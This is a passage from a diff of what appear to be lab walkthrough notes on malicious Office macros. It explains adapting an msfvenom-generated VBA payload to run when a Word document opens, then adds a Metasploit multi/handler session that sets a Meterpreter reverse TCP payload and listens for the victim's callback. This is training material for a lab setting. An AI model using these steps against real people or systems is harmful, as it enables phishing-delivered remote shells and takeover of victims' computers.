@@ -80,3 +80,17 @@ Payload size: 341 bytes
 Final size of vba file: 2698 bytes
 ```
 Import to note that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents.  
+```
+user@AttackBox$ msfconsole -q
+msf5 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.50.159.15
+LHOST => 10.50.159.15
+msf5 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf5 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 10.50.159.15:443 
+```
